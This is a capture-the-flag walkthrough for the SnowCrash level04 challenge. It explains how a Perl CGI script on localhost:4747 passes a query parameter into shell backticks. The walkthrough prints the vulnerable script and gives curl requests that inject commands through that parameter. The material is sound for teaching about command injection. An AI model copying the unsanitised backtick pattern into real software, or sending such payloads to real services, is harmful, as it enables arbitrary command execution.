# Find the Flag04 Password

When we log in as `level04`, we can see the `level04.pl` perl file in the home directory.

Open the file:

```sh
cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
~
```

The comment tells us that this Perl CGI script is served on `localhost:4747`.

Send a test request:

```sh
curl localhost:4747
```

The response is empty, but we can check whether the port is open with `nc -zv`. The `-z` option checks the connection without sending data, and `-v` enables verbose output:

```sh
level04@SnowCrash:~$ nc -zv localhost 4747
Connection to localhost 4747 port [tcp/*] succeeded!
```

This confirms that port `4747` is open, so we can send requests to the script.

## Inspect the Vulnerability

The script passes the `x` query parameter to the `x` function:

```perl
x(param("x"));
```

Inside that function, the value is inserted into a shell command:

```perl
print `echo $y 2>&1`;
```

In Perl, backticks execute the enclosed text as a shell command and return its output. Since `$y` comes directly from the user-controlled `x` parameter, we can inject another command by using shell command substitution.

Use absolute paths for injected commands so the shell does not depend on an uncertain `PATH`.

First, test the injection with `whoami`:

```sh
level04@SnowCrash:~$ curl localhost:4747/?x="\`/usr/bin/whoami\`"
flag04
```

The output is `flag04`, which confirms that the command is executed with the privileges of the `flag04` user.

Now run `getflag` with an absolute path:

```sh
level04@SnowCrash:~$ curl localhost:4747/?x="\`/bin/getflag\`"
```

This prints the token for the next level.
